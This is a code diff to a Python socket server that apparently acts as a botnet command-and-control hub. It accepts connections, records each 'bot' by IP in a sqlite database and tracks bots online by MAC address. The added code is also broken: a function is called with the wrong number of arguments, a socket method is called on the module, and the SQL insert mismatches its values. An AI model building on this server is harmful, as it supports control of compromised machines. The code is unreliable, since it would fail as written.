@@ -1,13 +1,40 @@
 import socket
 import threading
 import json
-from DatabaseSetup import createDatabase
-
-# Build Database
-createDatabase()
+import sqlite3
 
 
-conn_list={}
+
+
+def addBot(name, ip):
+    try:
+        sqliteConnection = sqlite3.connect('database.db')
+        cursor = sqliteConnection.cursor()
+
+        sqlite_insert_with_param = """INSERT INTO bots
+                          ( bot_ip) 
+                          VALUES (?);"""
+
+
+        data_tuple = (name, ip)
+        cursor.execute(sqlite_insert_with_param, data_tuple)
+
+
+        sqliteConnection.commit()
+        print("Bot Added ", cursor.rowcount)
+        cursor.close()
+
+    except sqlite3.Error as error:
+        print("Failed to add bot", error)
+    finally:
+        if sqliteConnection:
+            sqliteConnection.close()
+
+
+
+
+
+conn_list={}       
 def server():
     global conn_list
     HOST = ''                 # all available interfaces
@@ -21,11 +48,14 @@ def server():
         conn, addr = s.accept()
         mac=""
         if conn:
+            ip_address = socket.getpeername()[0]
+            addBot(ip_address)
 
             mac=conn.recv(4098).decode('utf-8')
             if mac:
                 if mac in conn_list:
                     print("\n[*] Bot Online:{}".format(mac))
+                
                 else:
                     print("\n[+] Bot Added:{}".format(mac))
                     conn_list[mac]=conn
